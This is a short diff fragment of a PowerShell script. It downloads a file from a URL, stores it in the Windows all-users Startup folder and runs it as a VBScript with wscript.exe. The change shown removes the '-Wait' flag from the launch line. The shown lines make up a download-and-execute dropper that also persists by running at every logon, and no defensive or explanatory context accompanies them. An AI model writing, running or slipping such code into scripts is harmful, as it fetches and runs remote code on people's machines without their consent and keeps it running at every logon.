@@ -6,4 +6,4 @@ $destination = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\9le
 Invoke-WebRequest -Uri $url -OutFile $destination
 
  # Run the VBScript
-Start-Process -FilePath "wscript.exe" -ArgumentList "`"$destination`"" -NoNewWindow -Wait
+Start-Process -FilePath "wscript.exe" -ArgumentList "`"$destination`"" -NoNewWindow 
